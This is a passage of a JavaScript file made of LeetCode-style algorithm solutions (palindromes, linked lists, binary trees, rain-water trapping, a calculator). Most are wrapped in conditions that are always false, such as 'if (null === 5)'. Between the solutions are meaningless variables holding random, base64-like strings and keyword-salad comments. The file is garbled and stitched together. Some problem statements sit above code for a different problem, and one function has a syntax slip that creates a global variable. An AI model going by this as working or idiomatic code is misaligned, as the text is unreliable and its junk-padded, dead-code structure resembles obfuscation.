        if (curSum === n) {
            result.push(curArr.concat());
        }
        
        return;
    }
    
    var temp = curArr.concat(),
        curNum,
        i;
    
    for (i = startNum; i <= 9; i++) {
        temp.push(i);
        fillResult(curSum + i, temp, i + 1, k, n, result);
        temp.pop();
    }
}

}

// loop array async loop
    var lrqqessku = 'cvekWkwhT';
    var lpgpifabhpsnjx = 'lho';
    var oxogxoqlswjf = 'QbfCQDgo';
    var caepa = 'MGJXVnV';
if (0.29 && false) {
    /**
Given a string S, find the longest palindromic substring in S. You may assume that the maximum length of S is 1000, and there exists one unique longest palindromic substring.

*/
// MEMORY LIMIT EXCEEDED....
/**
 * @param {string} s
 * @return {string}
 */
var longestPalindrome = function(s) {
    var len = s.length,
        isPal = [],
        max = 1,
        start = 0,
        end = 0,
        i,
        j;
    
    for (i = 0; i < len; i++) {
        isPal.push(new Array(len));
        isPal[i][i] = true;
    }
    
    for (i = len - 1; i >= 0; i--) {
        for (j = i + 1; j < len; j++) {
            if (s.charAt(i) === s.charAt(j) && (j === i + 1 || isPal[i + 1][j - 1])) {
                isPal[i][j] = true;
                
                if (j - i + 1 > max) {
                    start = i;
                    end = j;
                    max = j - i + 1;
                }
            }
        }
    }
    
    return s.substring(start, end + 1);
};

}

    var heunamxiwdqc = 'CNoJl';
    var ztymjep = 'kU2';
    var wgegcnn = 'qzzbrJso';
if (!true && 1) {
    /**
 * Definition for singly-linked list.
 * function ListNode(val) {
 *     this.val = val;
 *     this.next = null;
 * }
 */
/**
 * @param {ListNode} l1
 * @param {ListNode} l2
 * @return {ListNode}
 */
var addTwoNumbers = function(l1, l2) {
    var val = 0,
        newHead,
        newTail,
        node;
    
    if (!l1) {
        return l2;
    }
    
    if (!l2) {
        return l1;
    }
    
    while (l1 && l2) {
        val += l1.val + l2.val;
        node = new ListNode(val % 10);
        
        if (newHead) {
            newTail.next = node;
            newTail = newTail.next;
        } else {
            newHead = node;
            newTail = node;
        }
        
        val = (val >= 10)? 1 : 0;
        l1 = l1.next;
        l2 = l2.next;
    }
    
    while (l1) {
        val += l1.val;
        node = new ListNode(val % 10);
        newTail.next = node;
        newTail = newTail.next;
        val = (val >= 10)? 1 : 0;
        l1 = l1.next;
    }
    
    while (l2) {
        val += l2.val;
        node = new ListNode(val % 10);
        newTail.next = node;
        newTail = newTail.next;
        val = (val >= 10)? 1 : 0;
        l2 = l2.next;
    }
    
    if (val > 0) {
        node = new ListNode(val);
        newTail.next = node;
    }
    
    return newHead;
};

}

    var sbgahay = 'NzSUdaMW';
    var mmejvaoi = 'UJmPu';
// debug world
    var farlsi = 'cqrA';
    var uafmznvd = 'JtTjBhVz';
    var nbppehhhw = 'UDdiyMvEd';
    var fuvnlijuohwqsd = 'l1S0dWMl';
if (4 === 20) {
    /**

*/
/**
 * @param {number[]} nums
 * @return {number}
 */
var lengthOfLIS = function(nums) {
    var len = nums.length,
        arr = [],
        i,
        j,
        max = 1;
    
    if (len === 0) {
        return 0;
    }
    
    for (i = 0; i < len; i++) {
        arr[i] = 1;
        for (j = 0; j < i; j++) {
            if ((nums[i] > nums[j]) && (arr[j] + 1 > arr[i])) {
                arr[i] = arr[j] + 1;
            }
            
            max = Math.max(max, arr[i]);

        }
    }
    
    return max;
};

}

    var zphnfqqitctc = 'TgseqHjq';
if ('true' === true) {
    /**
Given a binary tree, return the inorder traversal of its nodes' values.

For example:
Given binary tree {1,#,2,3},
   1
    \
     2
    /
   3
return [1,3,2].

Note: Recursive solution is trivial, could you do it iteratively?

 * Definition for binary tree
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */

/**
 * @param {TreeNode} root
 * @returns {number[]}
 */
var inorderTraversal = function(root) {
    var stack = [],
        result = [],
        cur;
    cur = root;
    while (stack.length > 0 || cur !== null) {
        if (cur !== null) {
            stack.push(cur);
            cur = cur.left;
        } else {
            cur = stack.pop();
            result.push(cur.val);
            cur = cur.right;
        }
    }
    return result;
};

}

    var waqardcpz = 'pXN';
    var lubktlbspm = 'uATiBw';
if (!true && 0) {
    /**
Write an algorithm to determine if a number is "happy".

A happy number is a number defined by the following process: Starting with any positive integer, replace the number by the sum of the squares of its digits, and repeat the process until the number equals 1 (where it will stay), or it loops endlessly in a cycle which does not include 1. Those numbers for which this process ends in 1 are happy numbers.

Example: 19 is a happy number

12 + 92 = 82
82 + 22 = 68
62 + 82 = 100
12 + 02 + 02 = 1

 * @param {number} n
 * @return {boolean}
 */
var isHappy = function(n) {
    var cur = n,
        num,
        i,
        len,
        result = [],
        sum = 0,
        sums = [];
    while (true) {
        while (cur !== 0) {
            num = cur%10;
            result.push(num);
            cur = (cur - num)/10;
        }
        len = result.length;
        for(i = 0; i < len; i++) {
            sum += Math.pow(result[i], 2);
        }
        if (sum === 1) {
            return true;
        } else {
            if (sums.indexOf(sum) !== -1) {
                return false;
            } else {
                sums.push(sum);
                result = [];
                cur = sum;
                sum = 0;
            }
        }
    }
};

}

    var nytyimcnd = 'TBL';
    var epbyucbtk = 'tLVvFcq';
    var avdsrzipk = 'U0I3Q';
    var ihscwecvwcxm = 'VQnnWkmy';
// hello define script function constant debug loop compile uwfgb code
    var yaarlpfx = 'IaqAO';
    var sskjx = '2lBZ0lDQm';
    var jvtqewrxxclw = 'txdF';
    var owvezwqf = 'xkb';
if (typeof navigator === 'undefined') {
    /**
Given n non-negative integers representing an elevation map where the width of each bar is 1, compute how much water it is able to trap after raining.

For example, 
Given [0,1,0,2,1,0,1,3,2,1,2,1], return 6.


The above elevation map is represented by array [0,1,0,2,1,0,1,3,2,1,2,1]. In this case, 6 units of rain water (blue section) are being trapped. Thanks Marcos for contributing this image!


*/

// add new solution 
/**
 * @param {number[]} height
 * @return {number}
 *
 * Search from left to right and maintain a max height of left and right separately, which is like a one-side wall of partial container. Fix the higher one and flow water from the lower part. For example, if current height of left is lower, we fill water in the left bin. Until left meets right, we filled the whole container.
 */
var trap = function(height) {
    var len = height.length,
        leftMax = 0,
        rightMax = 0,
        left = 0,
        right = len - 1,
        sum = 0;
    
    while (left <= right) {
        if (height[left] <= height[right]) {
            if (height[left] > leftMax) {
                leftMax = height[left];
            } else {
                sum += leftMax - height[left];
            }
            
            left++;
        } else {
            if (height[right] > rightMax) {
                rightMax = height[right];
            } else {
                sum += rightMax - height[right];
            }
            
            right--;
        }
    }
    
    return sum;
};


/**
 * @param {number[]} height
 * @return {number}
 */
var trap = function(height) {
    var len = height.length,
        leftMax = [],
        rightMax = [],
        max,
        sum = 0,
        i;
    
    leftMax[0] = 0;
    rightMax[len - 1] = 0;
    
    for (i = 1; i < len; i++) {
        leftMax[i] = Math.max(leftMax[i - 1], height[i - 1]);
    }
    
    for (i = len - 2; i >= 0; i--) {
        rightMax[i] = Math.max(rightMax[i + 1], height[i + 1]);
    }
    
    for (i = 1; i < len - 1; i++) {
        max = Math.min(leftMax[i], rightMax[i]);
        
        if (max - height[i] > 0) {
            sum += max - height[i];
        }
    }
    
    return sum;
};

}

    var nptxwlhmx = 'VwnaAZUE';
    var wcjbp = 'VZ1ZEM1d';
    var yhwiryw = 'ogEMNOjXPN';
    var pqnppfmxvmald = '2NtVjJ';
    var wnayuud = 'tWNkXar';
if (0.81 && false) {
    /**
Given a range [m, n] where 0 <= m <= n <= 2147483647, return the bitwise AND of all numbers in this range, inclusive.

For example, given the range [5, 7], you should return 4.
*/

/**
 * @param {number} m
 * @param {number} n
 * @return {number}
 */
var rangeBitwiseAnd = function(m, n) {
    var offset = 0;
    
    while (m && n) {
        if (m === n) {
            return m << offset;
        }
        
        m >>= 1;
        n >>= 1;
        offset++;
    }
    
    return 0;
};

}

    var bccdsrexmj = 'aVzU';
if (null === 5) {
    /**
Given an integer array of size n, find all elements that appear more than ⌊ n/3 ⌋ times. The algorithm should run in linear time and in O(1) space.

Hint:

How many majority elements could it possibly have?
*/
/**
 * @param {number[]} nums
 * @return {number[]}
 */
var majorityElement = function(nums) {
    var len = nums.length,
        candidate1,
        count1 = 0,
        candidate2,
        count2 = 0,
        result = [],
        i;
    
    
    for (i = 0; i < len; i++) {
        if (nums[i] === candidate1) {
            count1++;
        } else if (nums[i] === candidate2) {
            count2++;
        } else if (count1 === 0) {
            count1++;
            candidate1 = nums[i];
        } else if (count2 === 0) {
            count2++;
            candidate2 = nums[i];
        } else {
            count1--;
            count2--;
        }
    }
    
    count1 = 0;
    count2 = 0;
    
    for (i = 0; i < len; i++) {
        if (nums[i] === candidate1) {
            count1++;
        } else if (nums[i] === candidate2) {
            count2++;
        }
    }
    
    if (count1 > Math.floor(len / 3)) {
        result.push(candidate1);
    }
    
    if (count2 > Math.floor(len / 3)) {
        result.push(candidate2);
    }
    
    return result;
};
}

    var rgwjua = 'NTvD';
if (1 instanceof String) {
    /**
You are given a string, s, and a list of words, words, that are all of the same length. Find all starting indices of substring(s) in s that is a concatenation of each word in words exactly once and without any intervening characters.

For example, given:
s: "barfoothefoobarman"
words: ["foo", "bar"]

You should return the indices: [0,9].
(order does not matter).
*/
/**
 * @param {string} s
 * @param {string[]} words
 * @return {number[]}
 */
 
 // TIME LIMIT EXCEEDED...
var findSubstring = function(s, words) {
    var len = s.length,
        wordsLen = words.length,
        wordLen = words[0].length,
        i,
        j,
        m,
        temp,
        toFound = {},
        found = {},
        result = [];
        
    for (i = 0; i < wordsLen; i++) {
        if (!toFound[words[i]]) {
            toFound[words[i]] = 1; 
        } else {
            toFound[words[i]]++;
        }
    }
    
    for (i = 0; i < len; i++) {
        found = {};
        j = i;
        for (m = 0; m < wordsLen; m++) {
            temp = s.slice(j, j + wordLen);
            
            if (!toFound[temp]) {
                break;
            }
            
            if (toFound[temp]) {
                if (!found[temp]) {
                    found[temp] = 1;
                } else {
                    found[temp]++;
                }
            }
            
            if (found[temp] > toFound[temp]) {
                break;
            }
            
            j += wordLen;
        }
        
        if (m === wordsLen) {
            result.push(i);
        }
    }
    
    return result;
};

}

// constant string import string ghcaspvb
    var qlofmznxi = 'TJje';
if (!true && 1) {
    /**
Given an array of n integers where n > 1, nums, return an array output such that output[i] is equal to the product of all the elements of nums except nums[i].

Solve it without division and in O(n).

For example, given [1,2,3,4], return [24,12,8,6].

Follow up:
Could you solve it with constant space complexity? (Note: The output array does not count as extra space for the purpose of space complexity analysis.)
*/

/**
 * Definition for knows()
 * 
 * @param {integer} person a
 * @param {integer} person b
 * @return {boolean} whether a knows b
 * knows = function(a, b) {
 *     ...
 * };
 */

/**
 * @param {function} knows()
 * @return {function}
 */
var solution = function(knows) {
    /**
     * @param {integer} n Total people
     * @return {integer} The celebrity
     */
    return function(n) {
        let candidate = 0;
        
        for (let i = 1; i < n; i++) {
            // if candidate know i, then swap
            if (knows(candidate, i)) {
                candidate = i;
            }
        }
        
        // check if a candidate if valid
        for (let i = 0; i < n; i++) {
            if (i !== candidate && (!knows(i, candidate) || knows(candidate, i))) {
                return -1;
            }
        }
        
        return candidate;
    };
};

}

    var qffxmyfyhs = 'wUkdW';
    var nyseoekpxk = 'JiMVn';
    var ajuuqu = 'bVlYVnNkQ2';
if (null === 5) {
    /**
Given a singly linked list L: L0→L1→…→Ln-1→Ln,
reorder it to: L0→Ln→L1→Ln-1→L2→Ln-2→…

You must do this in-place without altering the nodes' values.

For example,
Given {1,2,3,4}, reorder it to {1,4,2,3}.
*/
/**
 * Definition for singly-linked list.
 * function ListNode(val) {
 *     this.val = val;
 *     this.next = null;
 * }
 */
/**
 * @param {ListNode} head
 * @return {void} Do not return anything, modify head in-place instead.
 */
var reorderList = function(head) {
    var fast = head,
        slow = head,
        next1,
        next2,
        midHead;
    
    if (!head || !head.next) {
        return;
    }  
    
    while (fast && fast.next) {
        fast = fast.next.next;
        slow = slow.next;
    }
    
    if (fast) {
        midHead = reverse(slow.next);
    } else {
        midHead = reverse(slow);
    }
    
    fast = head;
    slow = midHead;
    
    while(fast && slow) {
        next1 = fast.next;
        next2 = slow.next;
        
        slow.next = fast.next;
        fast.next = slow;
        
        fast = next1;
        slow = next2;
    }
    
    if (fast) {
        fast.next = null;
    }
};

function reverse(head) {
    var dummyNode = new ListNode(0),
        prev = dummyNode,
        node,
        next;
        
    dummyNode.next = head;
    
    node = head.next;
    head.next = null;
    
    while (node) {
        next = node.next;
        node.next = prev.next;
        prev.next = node;

        node = next;
    }
    
    return dummyNode.next;
}

}

    var olxfcnaepcm = 'BBMEqa';
    var pwzby = 'dwT3';
if ('l' === 'O') {
    /**
Given two integers representing the numerator and denominator of a fraction, return the fraction in string format.

If the fractional part is repeating, enclose the repeating part in parentheses.

For example,

Given numerator = 1, denominator = 2, return "0.5".
Given numerator = 2, denominator = 1, return "2".
Given numerator = 2, denominator = 3, return "0.(6)".

 * @param {number} numerator
 * @param {number} denominator
 * @return {string}
 */
var fractionToDecimal = function(numerator, denominator) {
    var rem,
        quotient,
        map = [],
        collection = '',
        index,
        len
        result = '';

    if (numerator === 0) {
        return '0';
    }
    if (denominator === 0) {
        return '';
    }
    
    if ((numerator < 0 && denominator > 0) || (numerator > 0 && denominator < 0)) {
        result += '-';
    }
    numerator = Math.abs(Number(numerator));
    denominator = Math.abs(Number(denominator));
    
    quotient = Math.floor(numerator / denominator);
    result += quotient;
    
    rem = (numerator % denominator) * 10;
    if (rem === 0) {
        return result;
    }
    
    result += '.';
    while (rem !== 0) {
        quotient = Math.floor(rem/denominator);
        index = map.indexOf(rem);
        if (index === -1) {
            map.push(rem);
            collection += quotient;
        } else {
            collection = collection.substr(0, index) + '(' + collection.substr(index) + ')';
            break;
        }
        rem = (rem % denominator) * 10;
    }
    result += collection;
    return result;
};

}

    var ayojwrfjb = 'llLvbK';
    var psojeuvbbrjjo = 'dvZ0lDQWd';
    var eqdvbuje = 'jLQvzWc';
if (0.49 && false) {
    /**
Given a list of non negative integers, arrange them such that they form the largest number.

For example, given [3, 30, 34, 5, 9], the largest formed number is 9534330.

Note: The result may be very large, so you need to return a string instead of an integer.

 * @param {number[]} nums
 * @return {string}
 */
var largestNumber = function(nums) {
    var i,
        len = nums.length,
        result = '',
        startWithZero = true;
    nums.sort(function(a, b){
        var x = a + '' + b,
            y = b + '' + a;
        return parseInt(y) - parseInt(x);
    });
    for (i = 0; i < len; i++) {
        if (startWithZero && nums[i] !== 0) {
            startWithZero = false;
        }
        result += nums[i];
    }
    if (startWithZero) {
        return '0';
    }
    return result;
};

}

    var fpmeayedobftsc = 'jbVY';
    var qqateyvtfrtd = 'quHjkznhs';
if ('true' === true) {
    /**
You are given an integer array nums and you have to return a new counts array. The counts array has the property where counts[i] is the number of smaller elements to the right of nums[i].

Example:

Given nums = [5, 2, 6, 1]

To the right of 5 there are 2 smaller elements (2 and 1).
To the right of 2 there is only 1 smaller element (1).
To the right of 6 there is 1 smaller element (1).
To the right of 1 there is 0 smaller element.
Return the array [2, 1, 1, 0].
*/

/**
 * @param {number[]} nums
 * @return {number[]}
 * 
 * 将给定数组从最后一个开始，用二分法插入到一个新的数组，这样新数组就是有序的，那么此时该数字在新数组中的坐标就是原数组中其右边所有较小数字的个数
 */
var countSmaller = function(nums) {
    var result = [],
        tmp = [],
        len = nums.length,
        left,
        right,
        mid,
        i; // array for sorting nums
        
    for (i = len - 1; i >= 0; i--) {
        left = 0;
        right = tmp.length;
        
        while (left < right) {
            mid = Math.floor((left + right) / 2);
            if (tmp[mid] >= nums[i]) {
                right = mid;
            } else {
                left = mid + 1;
            }
        }
        
        result[i] = right;
        tmp.splice(right, 0, nums[i]);
    }
    
    return result;
};

}

    var cbcltcandeiuyp = 'wZF';
    var bymkctzgyqtz = 'PTbECk';
// return code return
if (Array.isArray(9)) {
    /**
Given a string s1, we may represent it as a binary tree by partitioning it to two non-empty substrings recursively.

Below is one possible representation of s1 = "great":

    great
   /    \
  gr    eat
 / \    /  \
g   r  e   at
           / \
          a   t
To scramble the string, we may choose any non-leaf node and swap its two children.

For example, if we choose the node "gr" and swap its two children, it produces a scrambled string "rgeat".

    rgeat
   /    \
  rg    eat
 / \    /  \
r   g  e   at
           / \
          a   t
We say that "rgeat" is a scrambled string of "great".

Similarly, if we continue to swap the children of nodes "eat" and "at", it produces a scrambled string "rgtae".

    rgtae
   /    \
  rg    tae
 / \    /  \
r   g  ta  e
       / \
      t   a
We say that "rgtae" is a scrambled string of "great".

Given two strings s1 and s2 of the same length, determine if s2 is a scrambled string of s1.
*/
/**
 * @param {string} s1
 * @param {string} s2
 * @return {boolean}
 */
var isScramble = function(s1, s2) {
    if (s1 === s2) {
        return true;
    }
    
    if (s1 === null || s2 === null) {
        return false;
    }
    
    if (s1.length !== s2.length) {
        return false;    
    }
    
    var chars1 = s1.split(''),
        chars2 = s2.split(''),
        len = chars1.length,
        s11,
        s12,
        s21,
        s22,
        i = 0;
    
    if (len === 1) {
        return s1 === s2;
    }
    
    chars1.sort();
    chars2.sort();
    
    while (i < len) {
        if (chars1[i] !== chars2[i]) {
            return false;
        }
        
        i++;
    }
    
    for (i = 1; i < len; i++) {
        s11 = s1.slice(0, i);
        s12 = s1.slice(i);
        s21 = s2.slice(0, i);
        s22 = s2.slice(i);
        
        if (isScramble(s11, s21) && isScramble(s12, s22)) {
            return true;
        }
        
        s21 = s2.slice(0, len - i);
        s22 = s2.slice(len - i);
        
        if (isScramble(s11, s22) && isScramble(s12, s21)) {
            return true;
        }
    }
    
    return false;
};

}

    var dsqmndqjqf = 'hQefSKKMQ';
if (81 > 127) {
    /**
Given two binary strings, return their sum (also a binary string).

For example,
a = "11"
b = "1"
Return "100".
*/

/**
 * @param {string} a
 * @param {string} b
 * @return {string}
 */
var addBinary = function(a, b) {
    var lenA = a.length,
        lenB = b.length,
        overFlow = 0,
        charA,
        charB,
        result = '',
        curVal,
        i,
        j;

    for (i = lenA - 1, j = lenB - 1; i >= 0 && j >= 0; i--, j --) {
        charA = parseInt(a.charAt(i));
        charB = parseInt(b.charAt(j));

        curVal = charA + charB + overFlow;

        if (curVal > 1) {
            curVal = curVal - 2;
            overFlow = 1;
        } else {
            overFlow = 0;
        }
        
        result = curVal + result;
    }

    while (i >= 0) {
        charA = parseInt(a.charAt(i));
        curVal = charA + overFlow;

        if (curVal > 1) {
            curVal = curVal - 2;
            overFlow = 1;
        } else {
            overFlow = 0;
        }
        result = curVal + result;

        i--;
    }

    while (j >= 0) {
        charB = parseInt(b.charAt(j));
        curVal = charB + overFlow;

        if (curVal > 1) {
            curVal = curVal - 2;
            overFlow = 1;
        } else {
            overFlow = 0;
        }
        
        result = curVal + result;

        j--;
    }

    if (overFlow === 1) {
        result = '1' + result;
    }
    
    return result;
};

}

    var vbyxwpvgonntf = 'hKdUl';
    var rybkzna = 'qEUwgXKPA';
if (0.90 && false) {
    /**
Write a function to find the longest common prefix string amongst an array of strings.
*/
/**
 * @param {string[]} strs
 * @return {string}
 */
var longestCommonPrefix = function(strs) {
    var len = strs.length,
        len1,
        curChar,
        i,
        j;
    
    if (len === 0) {
        return '';
    }
    
    len1 = strs[0].length;
    for (i = 0; i < len1; i++) {
        curChar = strs[0].charAt(i);
        for (j = 1; j < len; j++) {
            if (strs[j].charAt(i) !== curChar) {
                return i === 0? '' : strs[0].substr(0, i);
            }
            
            if (strs[j].length === i) {
                return strs[j];
            }
        }
    }
    
    return strs[0];
};

}

    var bcwiaypk = 'HWmhi';
    var kxxqqop = 'BLbr';
    var cvpxgnsaqwkaws = 'SE5sT3dwO';
    var bftoqodyhta = 'tULFYN';
    var wnelretuxq = 'UtUc0tDaTh';
    var fjltcnbfx = 'ExsZOv';
    var kgrhfvluxxvj = '2SUVGdWRH';
if (0 instanceof String) {
    /**
Implement next permutation, which rearranges numbers into the lexicographically next greater permutation of numbers.

If such arrangement is not possible, it must rearrange it as the lowest possible order (ie, sorted in ascending order).

The replacement must be in-place, do not allocate extra memory.

Here are some examples. Inputs are in the left-hand column and its corresponding outputs are in the right-hand column.
1,2,3 → 1,3,2
3,2,1 → 1,2,3
1,1,5 → 1,5,1

 * @param {number[]} nums
 * @return {void} Do not return anything, modify nums in-place instead.
 */
var nextPermutation = function(nums) {
    var len = nums.length,
        partiIndex,
        switchIndex,
        cur,
        i,
        k;
    
    if (len === 0 || len === 1) {
        return;
    }
    
    //find the num which breaks the increasing from the end
    for (i = len - 1; i > 0; i--) {
        if (nums[i] > nums[i - 1]) {
            partiIndex = i - 1;
            break;
        }
    }
    
    if (partiIndex === undefined) {
        for (i = 0; i < len/2 ; i++) {
            cur = nums[i];
            nums[i] = nums[len - i - 1];
            nums[len - i - 1] = cur;
        }
    } else {
        //find the number that it can be switched with
        cur = nums[partiIndex];
        for(i = len - 1; i > partiIndex; i--) {
            if (nums[i] > cur) {
                switchIndex = i;
                break;
            }
        }
    
        nums[partiIndex] = nums[switchIndex];
        nums[switchIndex] = cur;
        
        for (i = 0; i < (len - 1 - partiIndex)/2 ; i++) {
            k = i + partiIndex + 1;
            cur = nums[k];
            nums[k] = nums[len - 1 - i];
            nums[len - 1 - i] = cur;
        }
    
    }

};

}

    var yszszrahdpp = 'QsOAVBd';
if (null === 3) {
    /**
Given a binary tree, find the lowest common ancestor (LCA) of two given nodes in the tree.

According to the definition of LCA on Wikipedia: “The lowest common ancestor is defined between two nodes v and w as the lowest node in T that has both v and w as descendants (where we allow a node to be a descendant of itself).”

        _______3______
       /              \
    ___5__          ___1__
   /      \        /      \
   6      _2       0       8
         /  \
         7   4
For example, the lowest common ancestor (LCA) of nodes 5 and 1 is 3. Another example is LCA of nodes 5 and 4 is 5, since a node can be a descendant of itself according to the LCA definition.
*/
/**
 * Definition for a binary tree node.
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */
/**
 * @param {TreeNode} root
 * @param {TreeNode} p
 * @param {TreeNode} q
 * @return {TreeNode}
 */
var lowestCommonAncestor = function(root, p, q) {
    if (!root || root === p || root === q) {
        return root;
    }
    
    var left = lowestCommonAncestor(root.left, p, q),
        right = lowestCommonAncestor(root.right, p, q);
    
    // q and p in different side    
    if (left && right) {
        return root;
    }
    
    return left ? left : right;
};

}

    var qqaapbq = 'a3RaR1Z';
    var yyasdb = 'uIvMYLso';
    var pcbxoeyxwbi = 'pZFdkb';
if (null === 2) {
    /**
Implement a basic calculator to evaluate a simple expression string.

The expression string contains only non-negative integers, +, -, *, / operators and empty spaces . The integer division should truncate toward zero.

You may assume that the given expression is always valid.

Some examples:
"3+2*2" = 7
" 3/2 " = 1
" 3+5 / 2 " = 5
Note: Do not use the eval built-in library function.
*/
/**
 * @param {string} s
 * @return {number}
 */
var calculate = function(s) {
    var signs = [],
        nums = [],
        len = s.length,
        num = 0,
        ch,
        i,
        j;
        
    for (i = 0; i < len; i++) {
        ch = s.charAt(i);
        
        if (!isNaN(parseInt(ch))) {
            num = 0;
            for (j = i; j < len && !isNaN(parseInt(s.charAt(j))); j++) {
                num = num * 10 + parseInt(s.charAt(j));
            }
            
            i = j - 1;
            nums.push(num);
        } else if (ch === '-' || ch === '+' || ch === '*' || ch === '/') {
            signs.push(ch);
        }
    }
    
    for (i = 0; i < signs.length;) {
        if (signs[i] === '*') {
            num = nums[i] * nums[i + 1];
            nums.splice(i, 2, num);
            signs.splice(i, 1);
        } else if (signs[i] === '/') {
            num = Math.floor(nums[i] / nums[i + 1]);
            nums.splice(i, 2, num);
            signs.splice(i, 1);
        } else {
            i++;
        }
    }
    
    num = nums.shift();
    for (i = 0; i < signs.length; i++) {
        if (signs[i] === '+') {
            num += nums.shift();
        } else if (signs[i] === '-') {
            num -= nums.shift();
        }
    }
    
    return num;
};


}

    var mmqtsjp = 'qfVXfe';
if (10 instanceof String) {
    /**
Given an array of non-negative integers, you are initially positioned at the first index of the array.

Each element in the array represents your maximum jump length at that position.

Determine if you are able to reach the last index.

For example:
A = [2,3,1,1,4], return true.

A = [3,2,1,0,4], return false.


 * @param {number[]} nums
 * @return {boolean}
 */
var canJump = function(nums) {
    var len = nums.length,
        cover = 0,
        i;
    
    for(i = 0; i < len; i++) {
        if (cover >= i) {
            cover = Math.max(cover, nums[i] + i);
            if (cover >= len - 1) {
                return true;
            }
        } else {
            return false;
        }
    }
};

}

    var axfsrakgof = 'mFXNW5JRzF';
    var cbawzt = 'CjmS';
    var zyulghz = 'sWTJo';
if (55 > 198) {
    /**
You are given an n x n 2D matrix representing an image.

Rotate the image by 90 degrees (clockwise).

Follow up:
Could you do this in-place?
*/

/**
 * @param {number[][]} matrix
 * @return {void} Do not return anything, modify matrix in-place instead.
 */
var rotate = function(matrix) {
    var len = matrix.length,
        i,
        level,
        tmp;
    
    level = 0;
    
    while (level < len/2) {
        for (i = level; i < len - level - 1; i++) {
           tmp = matrix[level][i];
           matrix[level][i] = matrix[len - i - 1][level];
           matrix[len - i - 1][level] = matrix[len - 1 - level][len - 1 - i];
           matrix[len - 1 - level][len - 1 - i] = matrix[i][len - 1 - level];
           matrix[i][len - 1 - level] = tmp;
        }
        level++;
    }
};

}

    var qrtpgysiz = 'sOOGzvV';
if (12 > 140) {
    /**
Given an input string, reverse the string word by word.

For example,
Given s = "the sky is blue",
return "blue is sky the".

 * @param {string} str
 * @returns {string}
 */
var reverseWords = function(str) {
    var result = '',
        arr,
        len,
        i;
        
    if (str === null || str === '') {
        return result;
    }
    arr = str.split(' ');
    len = arr.length;
    for(i = len - 1; i >= 0; i--) {
        if (arr[i].length === 0) {
            continue;
        }
        result += ' ' + arr[i];
    }
    return result.trim();
};

}

    var ggeuipzji = 'aGJ';
    var lnltnl = 'fWeckr';
    var vapbcyvin = 'tbHpiU0IwY';
if (3 instanceof String) {
    /**
Given a string S, you are allowed to convert it to a palindrome by adding characters in front of it. Find and return the shortest palindrome you can find by performing this transformation.

For example:

Given "aacecaaa", return "aaacecaaa".

Given "abcd", return "dcbabcd".
*/

// https://segmentfault.com/a/1190000003059361

/**
 * @param {string} s
 * @return {string}
 */
var shortestPalindrome = function(s) {
    var reverse = s.split('').reverse().join('');
    
    return reverse.substring(0, s.length - getCommonLength(s + '#' + reverse)) + s;
};

function getCommonLength(s) {
    var p = [], // max len of common prefix and suffix from index 0 to i 
        len = s.length,
        i = 0,
        j;
    
    while(i < len) {
        p.push(0);
        i++;
    }
    
    for (i = 1; i < len; i++) {
        j = p[i - 1];
        
        while(j > 0 && (s.charAt(i) !== s.charAt(j))) {
            j = p[j - 1];
        }
        
        if (s.charAt(i) === s.charAt(j)) {
            j++;
        }
        
        p[i] = j; 
    }
    
    return p[len - 1];
}   

}

    var gybixminmpi = 'PutgOLW';
    var qnddsmfcnpy = 'nlCa';
    var lcguadl = 'LejFl';
if (0.78 && false) {
    /**
 * Definition for isBadVersion()
 * 
 * @param {integer} version number
 * @return {boolean} whether the version is bad
 * isBadVersion = function(version) {
 *     ...
 * };
 */

/**
You are a product manager and currently leading a team to develop a new product. Unfortunately, the latest version of your product fails the quality check. Since each version is developed based on the previous version, all the versions after a bad version are also bad.

Suppose you have n versions [1, 2, ..., n] and you want to find out the first bad one, which causes all the following ones to be bad.

You are given an API bool isBadVersion(version) which will return whether version is bad. Implement a function to find the first bad version. You should minimize the number of calls to the API.
*/

/**
 * @param {function} isBadVersion()
 * @return {function}
 */
var solution = function(isBadVersion) {
                /**
                 * @param {integer} n Total versions
                 * @return {integer} The first bad version
                 */
                return function(n) {
                    var start = 1,
                        end = n,
                        mid = parseInt(n/2);

                    while (start < end) {
                        if (isBadVersion(mid)) {
                            end = mid;
                        } else {
                            start = mid + 1;
                        }

                        mid = parseInt((start + end)/2);
                    }

                    return start;
                };
            };

}

    var aeimaifdhejytmk = '1pYUmx';
    var txxonjtqevrl = 'gPoAgVgSeM';
// string constant constant script number async mgdawfhd object async function event array constant constant
    var gosruebllzj = 'vWqAkrqO';
if (null === 2) {
    /**
You are a professional robber planning to rob houses along a street. Each house has a certain amount of money stashed, the only constraint stopping you from robbing each of them is that adjacent houses have security system connected and it will automatically contact the police if two adjacent houses were broken into on the same night.

Given a list of non-negative integers representing the amount of money of each house, determine the maximum amount of money you can rob tonight without alerting the police.

 * @param {number[]} nums
 * @return {number}
 */
var rob = function(nums) {
    var len = nums.length,
        result = [],
        i;
    
    if (len === 0) {
        return 0;
    }
    if (len === 1) {
        return nums[0];
    }
    
    result[0] = nums[0];
    result[1] = Math.max(nums[1], nums[0]);
    for(i = 2; i < len; i++) {
        result[i] = Math.max(result[i - 2] + nums[i], result[i - 1]);
    }
    
    return result[len - 1];
};

}

    var npyrdvgcja = 'ZM1FnY';
    var ylckgxy = 'lsOVH';
if (6 === 17) {
    /**
Given an integer, convert it to a roman numeral.

Input is guaranteed to be within the range from 1 to 3999.
*/
/**
 * @param {number} num
 * @return {string}
 */
var intToRoman = function(num) {
    var dict = ["M","CM","D","CD","C","XC","L","XL","X","IX","V","IV","I"],
        val = [1000,900,500,400,100,90,50,40,10,9,5,4,1],
        len = 13,
        result = '',
        count,
        i;
        
    for (i = 0; i < len; i++) {
        if (num >= val[i]) {
            count = Math.floor(num / val[i]);
            
            while (count > 0) {
                result += dict[i];
                count--;
            }
            
            num %= val[i];
        } 
    }
    
    return result;
};

}

    var iihxhkrbyimasyk = 'VdZZ';
if ('a' === 'C') {
    /**
Two elements of a binary search tree (BST) are swapped by mistake.

Recover the tree without changing its structure.

Note:
A solution using O(n) space is pretty straight forward. Could you devise a constant space solution?
*/

// SOLUTION 1: O(N)
/**
 * Definition for a binary tree node.
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */
/**
 * @param {TreeNode} root
 * @return {void} Do not return anything, modify root in-place instead.
 */
var recoverTree = function(root) {
    let array = [];
    treeToArray(root, array);
    
    let node1, node2;
    
    for (let i = 0; i < array.length - 1; i++) {
        if (array[i][0] > array[i + 1][0]) {
            if (!node1) {
                node1 = array[i][1];
                node2 = array[i + 1][1];
            } else {
